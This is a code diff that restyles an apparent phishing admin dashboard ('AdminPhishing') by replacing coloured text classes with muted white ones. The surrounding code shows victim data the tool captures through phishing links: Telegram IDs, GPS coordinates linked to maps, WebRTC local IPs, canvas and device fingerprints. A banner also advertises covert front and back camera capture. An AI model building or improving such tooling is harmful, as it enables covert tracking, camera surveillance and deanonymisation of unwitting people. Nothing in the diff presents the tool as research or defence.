@@ -130,7 +130,7 @@ function DeviceInfoPanel({ raw }: { raw: string | null }) {
   if (info.connection) rows.push({ icon: <Wifi className="h-3 w-3" />, label: "Network", value: `${info.connection.effectiveType ?? "?"} · ${info.connection.downlink ?? "?"}Mbps · RTT ${info.connection.rtt ?? "?"}ms` });
   if (info.language) rows.push({ icon: <Globe className="h-3 w-3" />, label: "Language", value: info.language });
   if (info.timezone) rows.push({ icon: <Clock className="h-3 w-3" />, label: "Timezone", value: info.timezone });
-  if (info.localIPs && info.localIPs.length > 0) rows.push({ icon: <Wifi className="h-3 w-3 text-orange-400" />, label: "Local IPs", value: info.localIPs.join(", ") });
+  if (info.localIPs && info.localIPs.length > 0) rows.push({ icon: <Wifi className="h-3 w-3 text-white/40" />, label: "Local IPs", value: info.localIPs.join(", ") });
   if (info.storage) rows.push({ icon: <HardDrive className="h-3 w-3" />, label: "Storage", value: `${formatBytes(info.storage.usage)} / ${formatBytes(info.storage.quota)}` });
   if (info.webglRenderer) rows.push({ icon: <Monitor className="h-3 w-3" />, label: "GPU", value: String(info.webglRenderer).slice(0, 60) });
   if (info.canvasHash) rows.push({ icon: <Fingerprint className="h-3 w-3" />, label: "Canvas FP", value: String(info.canvasHash) });
@@ -145,8 +145,8 @@ function DeviceInfoPanel({ raw }: { raw: string | null }) {
         className="w-full flex items-center justify-between p-2.5 text-left hover:bg-muted/20 transition-colors"
       >
         <div className="flex items-center gap-2">
-          <Fingerprint className="h-3.5 w-3.5 text-purple-400" />
-          <span className="text-xs font-medium text-purple-300">Device Fingerprint</span>
+          <Fingerprint className="h-3.5 w-3.5 text-white/40" />
+          <span className="text-xs font-medium text-white/50">Device Fingerprint</span>
           <Badge variant="outline" className="text-[9px] h-4 px-1">{rows.length} fields</Badge>
         </div>
         {open ? <ChevronUp className="h-3.5 w-3.5 text-muted-foreground" /> : <ChevronDown className="h-3.5 w-3.5 text-muted-foreground" />}
@@ -272,8 +272,8 @@ export function AdminPhishing() {
 
                     {cap.telegram_id && (
                       <div className="flex items-center gap-2">
-                        <User className="h-3.5 w-3.5 text-blue-400" />
-                        <span className="text-xs">TG ID: <code className="text-blue-400">{cap.telegram_id}</code></span>
+                        <User className="h-3.5 w-3.5 text-white/40" />
+                        <span className="text-xs">TG ID: <code className="text-white/50">{cap.telegram_id}</code></span>
                       </div>
                     )}
 
@@ -288,7 +288,7 @@ export function AdminPhishing() {
                           try { openLink(`https://maps.google.com/?q=${cap.latitude},${cap.longitude}`); }
                           catch { window.open(`https://maps.google.com/?q=${cap.latitude},${cap.longitude}`, "_blank"); }
                         }}
-                        className="flex items-center gap-2 text-emerald-400 hover:text-emerald-300 transition-colors"
+                        className="flex items-center gap-2 text-white/50 hover:text-white/70 transition-colors"
                       >
                         <MapPin className="h-3.5 w-3.5" />
                         <span className="text-xs">{cap.latitude!.toFixed(6)}, {cap.longitude!.toFixed(6)}</span>
@@ -387,8 +387,8 @@ export function AdminPhishing() {
             </div>
           </div>
 
-          <div className="bg-amber-500/5 border border-amber-500/20 rounded-xl p-3">
-            <p className="text-[10px] text-amber-400/80 leading-relaxed">
+          <div className="bg-white/5 border border-white/10 rounded-xl p-3">
+            <p className="text-[10px] text-white/40 leading-relaxed">
               🎣 Advanced capture: IP · GPS · Front &amp; back camera · WebRTC local IPs · Device fingerprint · Battery · Network info
             </p>
           </div>
@@ -456,7 +456,7 @@ export function AdminPhishing() {
                     <Button
                       size="sm"
                       variant="outline"
-                      className="h-7 w-7 p-0 text-red-400 hover:text-red-300"
+                      className="h-7 w-7 p-0 text-white/40 hover:text-white/60"
                       onClick={() => deleteLink(link.code)}
                     >
                       <Trash2 className="h-3 w-3" />
